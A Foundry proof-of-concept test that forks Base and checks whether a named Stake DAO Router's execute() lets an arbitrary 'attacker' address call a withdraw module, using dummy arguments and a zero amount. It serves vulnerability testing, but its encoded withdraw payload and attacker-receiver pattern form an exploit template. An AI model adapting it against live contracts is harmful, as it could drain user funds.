// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IRouter {
    function execute(bytes[] calldata calls) external payable returns (bytes[] memory);
    function owner() external view returns (address);
}

contract StakeDAOPoC is Test {
    // The OFFICIAL Stake DAO Router on Base
    IRouter constant router = IRouter(0x0f542fA75c871EB1b93Ef881b73e46acF733392f);

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_FORK_URL"));
    }

    function testPermissionlessExecute() public {
        address attacker = address(0xBAD);
        address owner = router.owner();
        
        console.log("Router Owner:", owner);
        console.log("Attacker:", attacker);
        require(attacker != owner, "Attacker is owner");

        // Module ID 0x01 = RouterModuleWithdraw
        // Payload: [0x01] + [withdraw(address,uint256,address)]
        // We use dummy arguments (address(1), 0, attacker) for the PoC.
        bytes memory payload = abi.encodePacked(
            bytes1(uint8(1)), // Module ID 0x01
            abi.encodeWithSignature(
                "withdraw(address,uint256,address)", 
                address(1), // dummy vault address
                0,          // dummy amount
                attacker    // receiver
            )
        );
        
        bytes[] memory calls = new bytes[](1);
        calls[0] = payload;

        vm.prank(attacker);
        
        try router.execute(calls) {
            console.log("SUCCESS: execute() is PERMISSIONLESS.");
        } catch Error(string memory reason) {
            console.log("Reverted with reason:", reason);
            if (keccak256(bytes(reason)) == keccak256(bytes("OwnableUnauthorizedAccount"))) {
                console.log("SAFE: Access control is present.");
            } else {
                console.log("VULNERABLE: Reverted, but NOT due to ownership.");
            }
        } catch (bytes memory) {
            console.log("Reverted with custom error (Potential vulnerability).");
        }
    }
}
